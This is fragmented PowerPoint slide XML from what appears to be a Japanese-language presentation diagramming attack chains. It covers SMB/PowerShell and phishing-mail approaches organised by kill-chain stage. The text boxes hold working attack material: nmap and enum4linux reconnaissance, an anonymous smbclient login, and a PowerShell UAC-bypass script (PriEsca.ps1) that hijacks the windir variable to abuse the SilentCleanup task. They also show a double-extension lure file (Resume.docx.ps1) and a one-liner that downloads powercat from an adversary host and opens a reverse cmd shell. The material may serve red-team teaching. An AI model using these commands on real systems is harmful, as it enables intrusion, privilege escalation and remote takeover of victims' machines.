        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8174520" y="2446920"/>
            <a:ext cx="836280" cy="25164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59" name="テキスト ボックス 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8616600" y="540000"/>
            <a:ext cx="686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Share folder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テキスト ボックス 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9073440" y="2606760"/>
            <a:ext cx="5706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Hostscan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" name="コネクタ: 曲線 34"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9633600" y="1709280"/>
            <a:ext cx="516960" cy="225720"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5003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62" name="テキスト ボックス 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10125360" y="1641960"/>
            <a:ext cx="622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Nmap  -sV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" name="コネクタ: 曲線 37"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9608760" y="1926000"/>
            <a:ext cx="516960" cy="99720"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5003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64" name="テキスト ボックス 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10064160" y="1929960"/>
            <a:ext cx="1030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Nc –v -z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" name="コネクタ: 曲線 43"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9667800" y="2444040"/>
            <a:ext cx="560520" cy="257400"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5006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66" name="コネクタ: 曲線 44"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="160" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9644040" y="2681280"/>
            <a:ext cx="1357920" cy="25920"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50013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67" name="テキスト ボックス 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10184400" y="2352240"/>
            <a:ext cx="896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Ping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テキスト ボックス 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10969920" y="2562120"/>
            <a:ext cx="1062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nc –v –w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" name="コネクタ: 曲線 47"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="154" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8363160" y="3126240"/>
            <a:ext cx="1050120" cy="172440"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5003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70" name="コネクタ: 曲線 48"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="171" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="16200000">
            <a:off x="9841680" y="3533760"/>
            <a:ext cx="406080" cy="162360"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5004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72" name="コネクタ: 曲線 77"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1" rot="5400000">
            <a:off x="8154720" y="1403640"/>
            <a:ext cx="1085040" cy="1062720"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49983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73" name="コネクタ: 曲線 90"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="10800000">
            <a:off x="4824360" y="2831400"/>
            <a:ext cx="979200" cy="489960"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49981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74" name="テキスト ボックス 93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3896640" y="3157200"/>
            <a:ext cx="9795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Plivilege escalation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5" name="コネクタ: 曲線 41"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="149" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6552000" y="2816640"/>
            <a:ext cx="1001160" cy="291240"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50035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76" name="テキスト ボックス 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7092360" y="3241440"/>
            <a:ext cx="730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Initial Access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テキスト ボックス 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8174520" y="3384720"/>
            <a:ext cx="325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ssh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8" name="コネクタ: 曲線 51"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="176" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7823160" y="3341520"/>
            <a:ext cx="384840" cy="143280"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50093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79" name="コネクタ: 曲線 54"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="160" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9644040" y="2706840"/>
            <a:ext cx="1173960" cy="361080"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5003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80" name="テキスト ボックス 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10717200" y="2972520"/>
            <a:ext cx="1099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Nmap –sn &lt;target ip&gt;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コネクタ: 曲線 56"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8407800" y="3491280"/>
            <a:ext cx="360360" cy="2016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82" name="テキスト ボックス 57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8683560" y="3457080"/>
            <a:ext cx="1017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Ssh user@ipaddress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コネクタ: 曲線 83"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="155" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="3814920" y="2060280"/>
            <a:ext cx="552600" cy="528840"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 4993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84" name="コネクタ: 曲線 88"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="10800000">
            <a:off x="3452760" y="3225960"/>
            <a:ext cx="498240" cy="358920"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49963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85" name="テキスト ボックス 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="36720" y="190440"/>
            <a:ext cx="75564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Approach2:smb and PowerShell</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="1600"/>
            </a:b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テキスト ボックス 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9119160" y="1790640"/>
            <a:ext cx="549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Portscan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コネクタ: 曲線 17"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="187" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9228600" y="771480"/>
            <a:ext cx="311760" cy="461520"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50057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88" name="テキスト ボックス 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8640000" y="0"/>
            <a:ext cx="1107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Credential Information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テキスト ボックス 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6663240" y="3877920"/>
            <a:ext cx="5320080" cy="29955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Privilege escalation to PowerShell code   (PriEsca.ps1)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if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {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Save-Module DSInternals -Path C:\Windows\System32\WindowsPowershell\v1.0\Modules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} else {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$registryPath = "HKCU:\Environment"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$Name = "windir"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$Value = "powershell -ep bypass -w h $PSCommandPath;#"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Set-ItemProperty -Path $registryPath -Name $name -Value $Value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#Depending on the performance of the machine, some sleep time may be required before or after schtasks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schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null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   Remove-ItemProperty -Path $registryPath -Name $name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}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テキスト ボックス 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9358200" y="3212280"/>
            <a:ext cx="1210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Privilege escalation code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テキスト ボックス 76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1163520" y="3605760"/>
            <a:ext cx="30474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Scp User@IPaddress:/Attacker/home/PriEsca.ps1C:/windows/temp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1" name="コネクタ: 曲線 78"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="10800000">
            <a:off x="2473920" y="3826440"/>
            <a:ext cx="592200" cy="336240"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49939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92" name="テキスト ボックス 92"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1448280" y="4054680"/>
            <a:ext cx="1144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Cd C;\Windows\Temp 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3" name="コネクタ: 曲線 94"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="10800000">
            <a:off x="1163520" y="4154400"/>
            <a:ext cx="372600" cy="32652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94" name="テキスト ボックス 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="529920" y="4380480"/>
            <a:ext cx="739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.\PriEsca.ps1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テキスト ボックス 102"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9073440" y="1191960"/>
            <a:ext cx="357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smb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コネクタ: 曲線 103"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="197" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="16200000">
            <a:off x="8920440" y="941040"/>
            <a:ext cx="159480" cy="43740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98" name="コネクタ: 曲線 105"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="188" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1" rot="5400000">
            <a:off x="8892720" y="298800"/>
            <a:ext cx="400680" cy="2026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87" name="テキスト ボックス 107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9540000" y="671760"/>
            <a:ext cx="1144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Enum4linux –a victimIP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コネクタ: 曲線 109"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="187" idx="0"/>
            <a:endCxn id="188" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="16200000">
            <a:off x="9417240" y="-23760"/>
            <a:ext cx="472320" cy="919080"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49961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00" name="テキスト ボックス 136"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="484920" y="1851840"/>
            <a:ext cx="3462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Start-Process powershell.exe –ArgumentList ‘-NoExit –command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$listener = [System.Net.Sockets.TcpListener]9999; $Listener.Start()’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380000" y="871560"/>
            <a:ext cx="2802960" cy="20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smbclient //&lt;IP&gt;/&lt;SharefolderName&gt; -U Anonymous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コネクタ: 曲線 10"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="197" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1" rot="5400000">
            <a:off x="8778600" y="678600"/>
            <a:ext cx="195840" cy="190440"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49907"/>
            </a:avLst>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="4472c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四角形: 角を丸くする 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5460480" y="3204360"/>
            <a:ext cx="1177920" cy="53388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chemeClr val="lt1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="游ゴシック"/>
              </a:rPr>
              <a:t>Attacker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4" name="コネクタ: 曲線 6"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="203" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="4646160" y="2943720"/>
            <a:ext cx="814320" cy="527760"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49977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05" name="コネクタ: 曲線 7"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="203" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="4633920" y="3462120"/>
            <a:ext cx="826920" cy="9720"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49956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06" name="コネクタ: 曲線 12"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="203" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="6638400" y="2663640"/>
            <a:ext cx="744840" cy="80820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07" name="テキスト ボックス 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6985800" y="2390040"/>
            <a:ext cx="9586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Reconnaissance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テキスト ボックス 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7135560" y="3405600"/>
            <a:ext cx="792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Weaponization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テキスト ボックス 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3935160" y="2841120"/>
            <a:ext cx="7452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Exploitation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テキスト ボックス 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3984120" y="3372840"/>
            <a:ext cx="743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Persistence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1" name="コネクタ: 曲線 11"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="16200000">
            <a:off x="2602440" y="2026080"/>
            <a:ext cx="547200" cy="167400"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49967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12" name="コネクタ: 曲線 47"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="213" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1" rot="5400000">
            <a:off x="7962120" y="3147120"/>
            <a:ext cx="289800" cy="42696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14" name="コネクタ: 曲線 48"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9441000" y="4221000"/>
            <a:ext cx="566280" cy="2530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15" name="コネクタ: 曲線 77"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="216" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="7944480" y="2471760"/>
            <a:ext cx="734400" cy="41760"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5002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16" name="テキスト ボックス 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8678520" y="2364120"/>
            <a:ext cx="5562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website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7" name="コネクタ: 曲線 81"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="207" idx="3"/>
            <a:endCxn id="218" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="7944480" y="2092680"/>
            <a:ext cx="877320" cy="40536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18" name="テキスト ボックス 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8821440" y="1985040"/>
            <a:ext cx="38952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SNS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コネクタ: 曲線 85"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9195840" y="2169000"/>
            <a:ext cx="631080" cy="31536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20" name="テキスト ボックス 89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9813240" y="2061360"/>
            <a:ext cx="8064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Mail Address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1" name="コネクタ: 曲線 90"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="10800000">
            <a:off x="4703400" y="3470760"/>
            <a:ext cx="749520" cy="465840"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49975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22" name="テキスト ボックス 93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3677040" y="3837960"/>
            <a:ext cx="10980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Plivilege escalation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コネクタ: 曲線 41"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6638760" y="3515040"/>
            <a:ext cx="568080" cy="7200"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50031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24" name="テキスト ボックス 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3880440" y="2948760"/>
            <a:ext cx="815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Initial Access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テキスト ボックス 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="101880" y="232920"/>
            <a:ext cx="7556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Approach3:Mail  Attack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6" name="コネクタ: 曲線 3"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="218" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9210960" y="2092680"/>
            <a:ext cx="615960" cy="76680"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50058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13" name="テキスト ボックス 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8124840" y="3000600"/>
            <a:ext cx="3909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Mail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7" name="コネクタ: 曲線 19"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="8474760" y="2875320"/>
            <a:ext cx="631080" cy="22788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28" name="コネクタ: 曲線 21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8496360" y="3098520"/>
            <a:ext cx="609480" cy="16884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29" name="テキスト ボックス 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9014040" y="2754000"/>
            <a:ext cx="6332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Templete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テキスト ボックス 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9032400" y="3115440"/>
            <a:ext cx="8175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Malicious file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テキスト ボックス 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8480160" y="3588480"/>
            <a:ext cx="13046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Dowmload powercat.git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コネクタ: 曲線 65"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="230" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9849960" y="1505880"/>
            <a:ext cx="1530000" cy="1717560"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50011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33" name="コネクタ: 曲線 71"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="230" idx="3"/>
            <a:endCxn id="234" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9849960" y="3223080"/>
            <a:ext cx="938160" cy="41400"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50019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34" name="テキスト ボックス 79"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10787760" y="3094920"/>
            <a:ext cx="1093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Doubule Extension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(Resume.docx.ps1)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コネクタ: 曲線 103"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6567480" y="3534840"/>
            <a:ext cx="758880" cy="708120"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50023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36" name="テキスト ボックス 105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7246800" y="4138560"/>
            <a:ext cx="5691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Delivery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コネクタ: 曲線 107"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="208" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7927560" y="3505680"/>
            <a:ext cx="617760" cy="165600"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50029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38" name="テキスト ボックス 111"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8613720" y="3851280"/>
            <a:ext cx="9939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Build Mail Server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テキスト ボックス 112"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9936720" y="3874680"/>
            <a:ext cx="1134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Postfix and Dovecot</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="800"/>
            </a:b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(POP3)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コネクタ: 曲線 113"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9525600" y="3960720"/>
            <a:ext cx="452160" cy="13320"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50039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41" name="コネクタ: 曲線 115"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="208" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7927560" y="3505680"/>
            <a:ext cx="750600" cy="423720"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 42898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42" name="テキスト ボックス 122"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8520480" y="4120200"/>
            <a:ext cx="100512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Build DNS Server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コネクタ: 曲線 126"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="236" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="16200000">
            <a:off x="7491240" y="4393440"/>
            <a:ext cx="407880" cy="327600"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50088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44" name="テキスト ボックス 128"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7528320" y="4719600"/>
            <a:ext cx="66024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Send Mail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テキスト ボックス 132"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2913120" y="2303280"/>
            <a:ext cx="97632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Victim open mail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テキスト ボックス 134"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7816320" y="-495000"/>
            <a:ext cx="3462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Start-Process powershell.exe –ArgumentList ‘-NoExit –command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$listener = [System.Net.Sockets.TcpListener]9999; $Listener.Start()’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7" name="コネクタ: 曲線 8"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="208" idx="3"/>
            <a:endCxn id="242" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7927560" y="3505680"/>
            <a:ext cx="593280" cy="722520"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5003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48" name="テキスト ボックス 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9941760" y="4379760"/>
            <a:ext cx="38952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bind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9" name="コネクタ: 曲線 30"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="3775680" y="2516400"/>
            <a:ext cx="422280" cy="364680"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49914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50" name="コネクタ: 曲線 44"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="3603600" y="3452760"/>
            <a:ext cx="424080" cy="9720"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49957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51" name="テキスト ボックス 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="298080" y="1443960"/>
            <a:ext cx="418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Powershell –c “IEX(New-Object System.Net.WebClient).DownloadString</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="800"/>
            </a:b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(‘http://AdversaryIP:8080/powercat.ps1’); powercat –c AdversaryIP –p 1234 –e cmd”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2" name="コネクタ: 曲線 2"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
